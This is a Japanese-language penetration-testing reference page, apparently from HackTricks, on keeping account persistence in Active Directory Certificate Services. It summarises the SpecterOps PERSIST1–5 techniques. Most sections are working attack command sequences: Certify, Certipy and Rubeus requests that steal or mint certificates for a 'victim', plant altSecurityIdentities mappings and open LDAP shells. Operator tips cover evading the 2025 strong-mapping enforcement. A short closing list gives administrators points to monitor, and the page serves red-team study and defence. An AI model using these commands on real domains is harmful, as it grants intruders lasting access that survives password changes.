# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**これは、[https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf) の優れた research における account persistence の章を簡潔にまとめたものです**<sup>[[7]](#references)</sup>

## 証明書を使用したアクティブユーザーの credential 窃取 – PERSIST1

ドメイン authentication を可能にする証明書をユーザーが request できる scenario では、攻撃者はこの証明書を request して窃取し、network 上で persistence を維持できます。デフォルトでは、Active Directory の `User` template はこのような request を許可していますが、無効化されている場合もあります。<sup>[[3]](#references)[[7]](#references)</sup>

[Certify](https://github.com/GhostPack/Certify) または [Certipy](https://github.com/ly4k/Certipy) を使用すると、client authentication を許可する有効な template を検索し、その template を request できます。
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Newer Certify 2.0 syntax with filtering to enabled client-auth templates
Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
証明書の強みは、証明書が有効であり続ける限り、パスワードが変更されても、その証明書の所有者であるユーザーとして認証できることにあります。

PEM を PFX に変換し、それを使用して TGT を取得できます。
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Note: 他の techniques（THEFT セクションを参照）と組み合わせることで、certificate-based auth は LSASS に触れることなく、また非昇格コンテキストからでも永続的なアクセスを可能にします。

## Certificates による Machine Persistence の取得 - PERSIST2

攻撃者がホスト上で昇格した権限を持っている場合、既定の `Machine` template を使用して、侵害したシステムの machine account に certificate を登録できます。machine として認証することで、ローカルサービス向けの S4U2Self が可能になり、永続的なホスト persistence を実現できます:<sup>[[3]](#references)[[7]](#references)</sup>
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## 証明書の更新によるPersistenceの拡張 - PERSIST3

証明書テンプレートの有効期間と更新期間を悪用すると、攻撃者は長期的なアクセスを維持できます。以前に発行された証明書とその秘密鍵を保有している場合、有効期限が切れる前に更新して、新しく有効期間の長いcredentialを取得できます。これにより、元のprincipalに紐付く追加のリクエスト痕跡を残さずに済みます。<sup>[[3]](#references)[[7]](#references)</sup>
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> 運用上のヒント: 攻撃者が保持する PFX ファイルの有効期間を追跡し、早めに更新してください。更新によって、最新の SID マッピング拡張を含む証明書に更新される場合もあり、より厳格な DC マッピングルールの下でも引き続き使用できるようになります（次のセクションを参照）。

## Explicit Certificate Mappings (altSecurityIdentities) の植え付け – PERSIST4

対象アカウントの `altSecurityIdentities` 属性に書き込める場合、攻撃者が制御する証明書をそのアカウントに明示的にマッピングできます。これはパスワード変更後も維持され、strong mapping formats を使用すると、最新の DC enforcement 下でも機能し続けます。<sup>[[2]](#references)</sup>

High-level flow:

1. 自分が制御する client-auth certificate を取得または発行します（例: 自分自身として `User` template に enroll する）。
2. 証明書から strong identifier（Issuer+Serial、SKI、または SHA1-PublicKey）を抽出します。
3. その identifier を使用して、victim principal の `altSecurityIdentities` に explicit mapping を追加します。
4. 証明書で authenticate すると、DC は explicit mapping を介して証明書を victim にマッピングします。

Example (PowerShell) using a strong Issuer+Serial mapping:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
その後、PFX を使用して認証します。Certipy は TGT を直接取得します。
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### 強力な `altSecurityIdentities` マッピングの構築

実際には、**Issuer+Serial** と **SKI** のマッピングは、攻撃者が保有する証明書から構築するのが最も簡単な強力な形式です。これは、**2025年2月11日**以降、DC がデフォルトで **Full Enforcement** になり、弱いマッピングが信頼できなくなるため重要です。<sup>[[1]](#references)</sup>
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
メモ
- 強力な mapping type のみ使用してください: `X509IssuerSerialNumber`、`X509SKI`、または `X509SHA1PublicKey`。弱い形式（Subject/Issuer、Subject-only、RFC822 email）は非推奨であり、DC policy によってブロックされる場合があります。
- mapping は **user** オブジェクトと **computer** オブジェクトの両方で機能するため、コンピューターアカウントの `altSecurityIdentities` への書き込みアクセスがあれば、そのマシンとして persistence できます。
- cert chain は、DC が信頼する root まで構築できなければなりません。NTAuth 内の Enterprise CAs は通常信頼されますが、環境によっては public CAs も信頼されます。
- DC に Smart Card Logon EKU がない、または `KDC_ERR_PADATA_TYPE_NOSUPP` を返すために PKINIT が失敗する場合でも、Schannel authentication は persistence に有効です。

#### 2025+ `Issuer/SID` explicit mappings

**2025年9月9日**の security update が適用された **Windows Server 2022 以降**の domain controller では、Microsoft が別の strong explicit mapping format を追加しました。これは、同じ CA からの証明書再発行後も維持されるため、persistence に適しています。<sup>[[6]](#references)</sup>
```powershell
# Same issuer formatting rules as Issuer+Serial
$Issuer = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SID    = 'S-1-5-21-1111111111-2222222222-3333333333-1105'
$Map    = "X509:<I>$Issuer<SID>$SID"
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
運用上、これは以前の強い形式とは異なります：
- `Issuer+Serial` は **1つの正確な証明書** をピン留めします。
- `SKI` / `SHA1-PUKEY` は **1つのキーペア** をピン留めします。
- `Issuer/SID` は **発行 CA + 対象 SID** をピン留めするため、同じ CA から更新または再発行された証明書は、`altSecurityIdentities` を書き換えなくても引き続き機能します。

要件と注意点
- ログオン時に提示される証明書には、SID security extension 内に対象アカウントの SID が実際に含まれていなければなりません。
- この形式は、SID extension を省略する `ESC9` / `ESC16` スタイルの証明書には役立ちません。その場合は `Issuer+Serial`、`SKI`、または `SHA1-PUKEY` にフォールバックしてください。

weak explicit mappings と attack paths の詳細については、以下を参照してください：


{{#ref}}
domain-escalation.md
{{#endref}}

## Persistence としての Enrollment Agent – PERSIST5

有効な Certificate Request Agent/Enrollment Agent certificate を取得すると、ユーザーに代わってログオン可能な新しい証明書を自由に発行でき、agent PFX を persistence token としてオフラインに保持できます。Abuse workflow:<sup>[[7]](#references)</sup>
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
この persistence を排除するには、agent certificate または template permissions の revoke が必要です。

運用上の注意
- 最新の `Certipy` versions は `-on-behalf-of` と `-renew` の両方をサポートしているため、攻撃者は Enrollment Agent PFX を保持していれば、元の target account に再度アクセスすることなく、leaf certificates を発行し、後から更新できます。<sup>[[4]](#references)</sup>
- PKINIT ベースの TGT retrieval が不可能な場合でも、生成された on-behalf-of certificate は、`certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell` による Schannel authentication に引き続き使用できます。<sup>[[5]](#references)</sup>

## PKINIT が失敗した場合に Persisted Certificates を使用する

DC に Smart Card Logon 対応の certificate がない場合、PKINIT 経由の certificate logon は `KDC_ERR_PADATA_TYPE_NOSUPP` で失敗する可能性があります。これは persistence primitive を無効にするものではありません。同じ PFX は、多くの場合、Schannel-authenticated LDAP access に引き続き使用できます。<sup>[[5]](#references)</sup>
```bash
# LDAPS / Schannel shell as the mapped principal
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell

# LDAP StartTLS fallback if 636 is filtered but 389/TLS is reachable
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell -ldap-scheme ldap -ldap-port 389
```
これは、PERSIST4/PERSIST5 の後に特に有用です。Linux/macOS から操作を継続し、[shadow credentials](../acl-persistence-abuse/shadow-credentials.md) の配置や、書き込み可能な delegation 属性の編集など、他の directory persistence アクションを連鎖させることができます。

## 2025 Strong Certificate Mapping Enforcement: Persistence への影響

Microsoft KB5014754 により、domain controller に Strong Certificate Mapping Enforcement が導入されました。**2025 年 2 月 11 日**以降、DC は weak/ambiguous mapping に対してデフォルトで **Full Enforcement** となり、さらに **2025 年 9 月 9 日**の security update 以降、patch 済みの DC は従来の Compatibility-mode fallback をサポートしなくなりました。<sup>[[1]](#references)</sup> 実際の影響は以下のとおりです。

- SID mapping extension を持たない 2022 年以前の certificates は、DC が Full Enforcement の場合、implicit mapping に失敗する可能性があります。攻撃者は、AD CS 経由で certificates を更新して SID extension を取得するか、`altSecurityIdentities` に strong explicit mapping を植え付ける（PERSIST4）ことでアクセスを維持できます。
- strong format（`Issuer+Serial`、`SKI`、`SHA1-PUKEY`、および modern DC の `Issuer/SID`）を使用する explicit mapping は引き続き機能します。weak format（Issuer/Subject、Subject-only、RFC822）はブロックされる可能性があるため、persistence には使用しないでください。
- weak mapping が引き続き機能しているように見える場合は、信頼できる長期的な persistence path ではなく、unpatched または異なる設定の DC に遭遇したと考えてください。
- SID extension を抑制する `ESC9` / `ESC16` style の issuance path では `Issuer/SID` が使用できなくなるため、fallback strong mapping または通常の template 経由での renewal が、実用的な persistence option になります。

Administrators は以下を監視し、alert を設定すべきです。

- `altSecurityIdentities` の変更、および Enrollment Agent と User certificates の issuance/renewal。
- on-behalf-of request と通常とは異なる renewal pattern に関する CA issuance log。

## References

- [1] [Microsoft Support – KB5014754: Windows domain controller における certificate-based authentication の変更](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [2] [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [3] [GhostPack/Certify Wiki – Account Persistence Techniques](https://github.com/GhostPack/Certify/wiki/2-%E2%80%90-Account-Persistence-Techniques)
- [4] [Certipy Wiki – Command Reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [5] [Almond Offensive Security – PKINIT がサポートされていない場合の certificates による authentication](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
- [6] [Microsoft Community Hub – 新しい Issuer/SID AltSecID の紹介](https://techcommunity.microsoft.com/blog/publicsectorblog/introducing-a-new-issuersid-altsecid/4454231)
- [7] [SpecterOps – Certified Pre-Owned: Active Directory Certificate Services の Abuse](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)

{{#include ../../../banners/hacktricks-training.md}}
